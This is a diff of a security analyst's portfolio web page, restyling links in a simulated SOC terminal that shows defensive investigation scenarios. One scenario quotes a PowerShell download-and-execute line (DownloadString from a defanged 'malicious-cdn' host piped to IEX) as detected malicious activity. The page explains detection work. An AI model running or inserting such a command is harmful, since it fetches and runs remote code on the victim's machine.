@@ -143,7 +143,7 @@
     </div>
     
     <h1 data-scramble="Network security roots. Modern multi-tenant SOC execution.">
-      Network security roots.<br><span class="gradient-text">Modern multi-tenant SOC execution.</span>
+      Network security roots.<br>Modern multi-tenant SOC execution.
     </h1>
     
     <p class="hero-sub">
@@ -679,7 +679,7 @@ function runTerminalScenario(type) {
       <div class="output-info">[-] Correlating Host Socket (msedge.exe) with Firewall DeviceAction...</div>
       <div class="output-drop">[DROP] Perimeter Firewall rule 'Block_Untrusted_Egress' dropped TCP handshake at 14:02:18 GST</div>
       <div class="output-success">[VERDICT: MITIGATED] Zero external egress. Host verified clean. Blast radius: 1 asset.</div>
-      <div><a href="./cases/sentinel-c2-indicator.html" style="color: #38BDF8; text-decoration: underline;">&rarr; Open Detailed Sentinel C2 Case Study</a></div>
+      <div><a href="./cases/sentinel-c2-indicator.html" style="color: #FB923C; text-decoration: underline;">&rarr; Open Detailed Sentinel C2 Case Study</a></div>
     `);
   } else if (type === 'unsloth') {
     appendTerminal(`
@@ -690,7 +690,7 @@ function runTerminalScenario(type) {
       <div style="color: #94A3B8; font-size: 12px;">$payload = [System.Net.WebClient]::DownloadString('hxxps://malicious-cdn.net/stage2.bin'); IEX $payload</div>
       <div class="output-alert">[MITRE ATT&amp;CK]: T1059.001 (Command &amp; Scripting Interpreter) | T1027 (Obfuscated Files)</div>
       <div class="output-success">[STATUS]: Offline airgap preserved. Zero client PII transmitted to cloud.</div>
-      <div><a href="./cases/unsloth-lora-secops.html" style="color: #38BDF8; text-decoration: underline;">&rarr; Open Full Unsloth LoRA Fine-Tuning Case Study</a></div>
+      <div><a href="./cases/unsloth-lora-secops.html" style="color: #FB923C; text-decoration: underline;">&rarr; Open Full Unsloth LoRA Fine-Tuning Case Study</a></div>
     `);
   } else if (type === 'vpn') {
     appendTerminal(`
@@ -700,7 +700,7 @@ function runTerminalScenario(type) {
       <div class="output-drop">[DIAGNOSTIC]: Packet absent on Firewall WAN interface X1.</div>
       <div class="output-alert">[ROOT CAUSE]: Local route table conflict: Secondary active VPN injected 0.0.0.0/0 route with metric 10.</div>
       <div class="output-success">[RESOLUTION]: Applied split-tunnel route exclusion. SSL VPN tunnel established in 1.2s.</div>
-      <div><a href="./cases/multi-vpn-routing-conflict.html" style="color: #38BDF8; text-decoration: underline;">&rarr; Open Multi-VPN Route Interception Case Study</a></div>
+      <div><a href="./cases/multi-vpn-routing-conflict.html" style="color: #FB923C; text-decoration: underline;">&rarr; Open Multi-VPN Route Interception Case Study</a></div>
     `);
   } else if (type === 'portscan') {
     appendTerminal(`
@@ -710,7 +710,7 @@ function runTerminalScenario(type) {
       <div class="output-info">[-] Enumerating target port scope: Port 445 (SMB) = 99.8% of traffic.</div>
       <div class="output-info">[-] Cross-referencing CMDB asset registry: Host 10.12.8.254 = Central Veeam Backup Node.</div>
       <div class="output-success">[VERDICT: BENIGN REPETITION] Legitimate scheduled backup stream. Scoped exclusion proposed.</div>
-      <div><a href="./cases/internal-portscan-analysis.html" style="color: #38BDF8; text-decoration: underline;">&rarr; Open Internal Port-Scan Case Study</a></div>
+      <div><a href="./cases/internal-portscan-analysis.html" style="color: #FB923C; text-decoration: underline;">&rarr; Open Internal Port-Scan Case Study</a></div>
     `);
   }
 }
@@ -742,7 +742,7 @@ document.getElementById('terminalInput').addEventListener('keydown', (e) => {
         <div class="output-info">10. Firewall Service Reachability | 11. Layer 2 Bridge Anti-Spoof | 12. Physical Interface Diagnostics</div>
         <div class="output-info">13. Cloud Sandbox ATP &amp; EDR | 14. SSL VPN Impossible Travel | 15. MSSP Queue Tuning</div>
         <div class="output-info">16. Anonymized Log Triage | 17. Windows 4688 Sysmon C2 Beaconing</div>
-        <div><a href="./investigations.html" style="color: #38BDF8; text-decoration: underline;">&rarr; Browse All in Dedicated Investigations Hub</a></div>
+        <div><a href="./investigations.html" style="color: #FB923C; text-decoration: underline;">&rarr; Browse All in Dedicated Investigations Hub</a></div>
       `);
     } else if (val === 'clear') {
       clearTerminal();
